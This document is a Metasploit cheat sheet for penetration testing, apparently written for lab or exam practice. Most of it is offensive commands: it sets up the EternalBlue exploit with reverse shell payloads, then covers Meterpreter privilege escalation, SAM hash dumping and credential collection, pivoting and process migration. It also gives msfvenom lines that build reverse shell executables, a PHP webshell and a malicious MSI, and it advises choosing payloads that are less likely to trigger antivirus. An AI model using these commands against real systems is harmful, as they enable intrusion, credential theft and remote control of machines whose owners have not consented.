# Metasploit Reference

The goal of this reference is to cover the commands needed to use Metasploit effectively when it's the right tool for the job.

---

## Basic Workflow

```sh
# Start
msfconsole
msfconsole -q    # quiet - no banner

# Search for an exploit
search ms17-010
search eternalblue
search vsftpd 2.3.4
search type:exploit platform:windows smb

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use 0    # use result number from search

# See what options you need to set
show options
show payloads    # list available payloads

# Set options
set RHOSTS 10.10.10.5
set LHOST 10.10.14.2
set LPORT 4444
set PAYLOAD windows/x64/shell_reverse_tcp    # standard shell, not meterpreter
set PAYLOAD windows/x64/meterpreter/reverse_tcp    # meterpreter

# Run
run
exploit
check    # check if target is vulnerable without exploiting

# Background a session
background    # Ctrl+Z

# List sessions
sessions
sessions -i 1    # interact with session 1
```

---

## Payloads - Know the Difference

| Payload | What it gives you |
|---|---|
| `windows/shell_reverse_tcp` | Basic cmd.exe shell |
| `windows/x64/shell_reverse_tcp` | 64-bit basic shell |
| `windows/meterpreter/reverse_tcp` | Meterpreter - feature-rich |
| `linux/x64/shell_reverse_tcp` | Linux basic shell |

**Rule of thumb:** Use `shell_reverse_tcp` (not meterpreter) unless you specifically need Meterpreter features. Meterpreter is more likely to trigger AV.

---

## Multi/Handler (Catching Manual Shells)

Use this when you generate a payload with msfvenom and need a listener that can handle it:

```sh
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp    # match your msfvenom payload
set LHOST <KALI-IP>
set LPORT 4444
run
```

> For basic `nc -e` shells, just use `nc -lvnp 4444` - no need for multi/handler.

---

## Meterpreter Commands

```sh
# Basic info
sysinfo           # OS, hostname
getuid            # current user
getpid            # process ID

# Privilege escalation
getsystem         # try to get SYSTEM (attempts various techniques)
getuid            # verify you're SYSTEM

# Credentials
hashdump          # dump local SAM hashes (needs SYSTEM)
run post/windows/gather/credentials/credential_collector

# File operations
download C:\Users\Administrator\Documents\target_file.txt    # download file
upload /local/path/tool.exe C:\Windows\Temp\tool.exe         # upload file
ls                # list directory
cd C:\\Users

# Shell
shell             # drop to cmd.exe (Ctrl+Z to go back to meterpreter)
execute -f cmd.exe -i    # interactive cmd

# Pivoting
run post/multi/manage/shell_to_meterpreter    # upgrade shell to meterpreter
portfwd add -l 3389 -p 3389 -r <internal-ip>    # port forward

# Process migration (for stability or privilege)
ps                    # list processes
migrate <PID>         # migrate to another process - pick SYSTEM process
```

---

## msfvenom (Generating Payloads)

Use this even when NOT using Metasploit - standalone payloads work with nc listener.

```sh
# Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe

# Windows reverse shell with meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > met.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf

# PHP webshell
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php

# ASP for IIS
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f asp > shell.asp

# MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > evil.msi

# With bad char exclusion
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00\x0a" -f exe > shell.exe

# For BOF shellcode (c format)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```
